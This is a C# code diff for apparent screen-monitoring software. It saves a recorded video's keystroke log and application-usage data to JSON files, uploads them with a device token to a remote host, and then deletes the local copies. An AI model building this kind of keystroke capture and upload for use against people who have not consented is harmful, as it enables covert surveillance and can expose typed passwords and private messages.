@@ -94,6 +94,8 @@ namespace AppRealtime
                     _rec.Stop();
 
                     await WaitUntil(() => _rec.Status == RecorderStatus.Idle);
+                    var keyLogJsonPath = videoPath.Replace(".mp4", "_UserAction.json");
+                    var appsJsonPath = videoPath.Replace(".mp4", "_UserSession.json");
 
                     _ = Task.Run(async () =>
                     {
@@ -114,8 +116,10 @@ namespace AppRealtime
                             }
 
                             var appsJson = JsonConvert.SerializeObject(appTimes);
+                            File.WriteAllText(appsJsonPath, appsJson);
                             var keyLogJson = JsonConvert.SerializeObject(keylog);
-                            Console.WriteLine(keyLogJson);
+                            File.WriteAllText(keyLogJsonPath, keyLogJson);
+
                             const int MAX_RETRIES = 5;
                             for (int i = 0; i < MAX_RETRIES; i++)
                             {
@@ -127,13 +131,13 @@ namespace AppRealtime
                                 try
                                 {
                                     var client = new HttpClient();
-                                    var request = new HttpRequestMessage(HttpMethod.Post, _appSettings.Host);
+                                    var request = new HttpRequestMessage(HttpMethod.Post, _appSettings.VideoHost);
                                     request.Headers.Add("accept", "*/*");
                                     var content = new MultipartFormDataContent();
                                     content.Add(new StreamContent(File.OpenRead(videoPath)), "Video", videoPath);
-                                    content.Add(new StringContent(_appSettings.IP), "ip");
-                                    content.Add(new StringContent(keyLogJson), "keylog");
-                                    content.Add(new StringContent(appsJson), "apps");
+                                    content.Add(new StreamContent(File.OpenRead(keyLogJsonPath)), "UserAction", keyLogJsonPath);
+                                    content.Add(new StreamContent(File.OpenRead(appsJsonPath)), "UserSession", appsJsonPath);
+                                    content.Add(new StringContent(_appSettings.DeviceToken), "token");
                                     request.Content = content;
                                     var response = await client.SendAsync(request);
                                     response.EnsureSuccessStatusCode();
@@ -153,6 +157,8 @@ namespace AppRealtime
                         finally
                         {
                             File.Delete(videoPath);
+                            File.Delete(keyLogJsonPath);
+                            File.Delete(appsJsonPath);
                         }
                     });
                 }
